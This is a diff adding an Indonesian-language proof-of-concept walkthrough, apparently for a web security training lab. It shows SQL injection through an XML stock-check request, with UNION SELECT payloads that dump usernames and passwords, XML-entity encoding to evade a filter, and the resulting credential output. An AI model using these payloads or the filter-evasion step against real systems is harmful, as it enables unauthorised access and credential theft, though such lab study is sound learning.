@@ -21,6 +21,82 @@ References:
 
 ---------------------------------------------
 
+Simple POC
+
+---
+
+### **Langkah 1: Identifikasi SQL Injection**
+1. Kirimkan payload berikut dalam parameter XML request untuk menguji SQL Injection:
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <stockCheck>
+       <productId>1</productId>
+       <storeId>1 UNION SELECT NULL</storeId>
+   </stockCheck>
+   ```
+   **Penjelasan**:
+   - Parameter `<storeId>` dimodifikasi untuk menyisipkan query SQL menggunakan `UNION SELECT`.
+   - Jika respons server berubah, itu menunjukkan bahwa aplikasi rentan terhadap SQL Injection.
+
+---
+
+### **Langkah 2: Eksploitasi SQL Injection**
+2. Ubah payload untuk menggunakan `UNION SELECT` dengan kolom sesuai target:
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <stockCheck>
+       <productId>1</productId>
+       <storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
+   </stockCheck>
+   ```
+   **Penjelasan**:
+   - Payload ini mengambil data dari tabel `users` dengan kolom `username` dan `password`.
+   - Simbol `||` digunakan untuk menggabungkan nilai `username` dan `password` dengan pemisah `~`.
+
+---
+
+### **Langkah 3: Encode Payload dengan Hash Entities (HackVector)**
+3. Encode karakter sensitif dalam payload menggunakan entitas XML agar dapat melewati filter keamanan aplikasi:
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <stockCheck>
+       <productId>1</productId>
+       <storeId>1 UNION SELECT username || '&#126;' || password FROM users</storeId>
+   </stockCheck>
+   ```
+   **Penjelasan**:
+   - Simbol `~` diubah menjadi kode entitas `&#126;` untuk menghindari deteksi atau sanitasi input.
+   - Gunakan alat seperti **HackVector** untuk melakukan encoding otomatis pada payload.
+
+---
+
+### **Langkah 4: Kirim Request dan Analisis Respons**
+4. Kirimkan payload terencode melalui alat seperti **Burp Suite** atau **Postman**.
+   - Jika berhasil, server akan merespons dengan data gabungan `username~password`:
+     ```
+     HTTP/2 200 OK
+     Content-Type: text/plain; charset=utf-8
+     X-Frame-Options: SAMEORIGIN
+     Content-Length: 100
+
+     566 units
+     wiener~z506ur5kimtupjsvl4l6
+     administrator~twbrv625a0r6illow9gg
+     carlos~e9em4neb7nqwq7kukimf
+     ```
+
+---
+
+### **Langkah 5: Ekstraksi dan Penyimpanan Data**
+5. Simpan data kredensial yang berhasil didapatkan untuk analisis lebih lanjut:
+   - Username: `wiener`, Password: `z506ur5kimtupjsvl4l6`
+   - Username: `administrator`, Password: `twbrv625a0r6illow9gg`
+   - Username: `carlos`, Password: `e9em4neb7nqwq7kukimf`
+
+
+--- 
+
+
 
 The following payload allows to execute (SELECT 1), which returns the same as sending productId 1 and storeId 1:
 
